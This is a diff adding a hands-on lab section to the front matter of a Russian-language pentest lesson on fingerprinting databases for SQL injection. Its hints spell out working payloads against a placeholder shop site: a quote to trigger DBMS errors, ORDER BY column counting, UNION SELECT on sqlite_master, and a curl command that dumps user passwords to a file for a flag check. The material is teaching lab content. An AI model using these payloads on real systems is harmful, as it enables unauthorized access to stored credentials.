@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 30
 summary: "Как определить СУБД по отклику и выбрать правильный диалект атаки: сводная карта синтаксиса и навигация к детальному разбору MySQL, PostgreSQL, MSSQL, Oracle и SQLite."
+lab:
+  kind: shell
+  title: "Практика: фингерпринт СУБД и UNION-дамп (SQLite)"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Добавь кавычку: curl -s 'https://shop.example/product?id=1%27' — текст ошибки называет СУБД."
+    - "Считай колонки: ORDER BY 3 работает, ORDER BY 4 падает — значит их три."
+    - "Список таблиц в SQLite лежит в sqlite_master: UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'."
+    - "Дампни пароль: curl -s 'https://shop.example/product?id=-1 UNION SELECT 1,password,3 FROM users' > found.txt — затем check."
 ---
 
 ## Вопрос, с которого всё начинается
